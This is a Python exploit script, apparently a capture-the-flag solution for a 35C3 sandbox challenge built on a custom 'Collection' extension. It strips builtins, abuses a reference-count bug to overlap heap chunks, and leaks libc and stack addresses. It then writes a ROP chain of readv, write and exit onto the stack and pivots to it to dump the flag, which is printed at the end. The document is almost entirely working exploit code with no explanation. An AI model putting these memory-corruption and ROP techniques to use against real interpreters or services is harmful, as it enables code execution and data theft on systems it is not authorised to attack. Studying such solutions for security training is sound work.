from sys import modules
import sys
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
for k in keys:
   if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
       del __builtins__.__dict__[k]

sys.stdout.write("dab\n")

##################
# prepare chunks #
##################
# scary man
z = Collection.Collection( {"a":0xdeadbeefcafeba} )
pyheap_base = id(z) # use later

###########
# M chunk #
###########
dic = {
	"-3":0,
	"-2":0,
	"-1":0,
	"0":[],
	"1":0,
	"2":0,
	"3":0,
	"4":[],
	"5":0,
	"6":0,
	"7":0,
	"8":0,
	"9":0,
	"10":0,
	"11":0,
	"12":0,
	"13":0,
	"14":0,
	"15":0,
	"16":0,
	"17":0,
	"18":0,
	"19":0,
	"20":0,
	"21":0,
	"22":0,
	"23":0,
	"24":0,
	"25":0,
	"26":0,
	"27":0,
	"28":0
}
m = Collection.Collection( dic )
# smth chunk
a = Collection.Collection( {"a":{"b":Collection.Collection({"c":[0xdeadbeef]})}} )
del z
# trigger refcount bug
for i in range(32):
	a.get("a") # doing this a lot to be safe
print(hex(id(a.get("a"))))
print(hex(id(m)))

# try to increase ref cnt?
b = a.get("a")["b"]
bb = []
for i in range((0x118+3*8)-1+10):
	bb.append(b)

# trigger overlap 
###########
# S chunk #
###########
dic2 = {
	"0":pyheap_base+0x150,
	"1":1,
	"2":0x9d3340, # Type array.array                ,#id(fake_type)+0x48, #Custom Type
	"3":1,
	"4":0x9b2ff8, # __libc_start_main@GOT
	"5":1,
	"6":0x715620, # "L\x00"
	"7":0,
	"8":0,
	"9":0,
	"10":0,
	"11":0,
	"12":0,
	"13":0,
	"14":0,
	"15":0,
	"16":0,
	"17":0,
	"18":0,
	"19":0,
	"20":0,
	"21":0,
	"22":0,
	"23":0,
	"24":0,
	"25":0,
	"26":0,
	"27":0,
	"28":0,
	"29":0,
	"30":0,
	"31":0
}

n = Collection.Collection( {"a":["sadder dab"]} )
s = Collection.Collection( dic2 )

#############
# LEAK LIBC #
#############
yo = m.get("0")
libc_base = yo[0]-0x21ab0 #leaked from __libc_start_main
print("libc_base : 0x{:x}".format(libc_base))

##############
# LEAK STACK #
##############
environ = 0xa4f980
del s
dic2["4"] = environ
s = Collection.Collection( dic2 )
stack_addr = yo[0]
print("stack_addr : 0x{:x}".format(stack_addr))

################################################
# THIS ACCOUNTS FOR DIFFERENCE IN REMOTE STACK #
################################################
del s
dic2["4"] = stack_addr-0x40+8
s = Collection.Collection( dic2 )
stack_addr = yo[0]
print("remote stack_addr : 0x{:x}".format(stack_addr))
stack_addr += 0x28

##############
# make iovec #
##############
"""
struct iovec {
               void  *iov_base;    /* Starting address */
               size_t iov_len;     /* Number of bytes to transfer */
           };
"""
rand_addr = 0x9d3000
del s
dic2["4"] = rand_addr
s = Collection.Collection( dic2 )
yo[0] = rand_addr+16
del s
dic2["4"] = rand_addr+8
s = Collection.Collection( dic2 )
yo[0] = 0x100


###############
# ROP GADGETS #
###############
pivot = 0x5e8152 # add rsp, 0x9c0; pop rbx; ret;
rdi = 0x421612 # pop rdi; ret; 
rsi = 0x42110e # pop rsi; ret;
rdx = 0x4026c1 # pop rdx; ret;
rax = 0x5216b6 # pop rax; pop rbx; ret;

readv = 0x4208b0
write = 0x4207e0
exit = 0x41f270


###################
# WRITE ROP CHAIN #
###################
rop_top = stack_addr+0x3d8+0x10
rop = []

# readv 1023
rop.append(rdi)
rop.append(1023)
rop.append(rsi)
rop.append(rand_addr)
rop.append(rdx)
rop.append(1)
rop.append(readv)

# write flag out
rop.append(rdi)
rop.append(1)
rop.append(rsi)
rop.append(rand_addr+0x10)
rop.append(rdx)
rop.append(0x100)
rop.append(write)

# clean exit
rop.append(exit)

i = 0

del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1
del s
dic2["4"] = rop_top
s = Collection.Collection( dic2 )
yo[0] = rop[i]
rop_top += 8; i+=1

#####################
# TRIGGER ROP CHAIN #
#####################
del s
dic2["4"] = stack_addr-0x5e8 #0x9d3000
s = Collection.Collection( dic2 )
yo[0] = pivot

"""
35C3_l1st_equiv4lency_is_n0t_l15t_equ4l1ty
"""
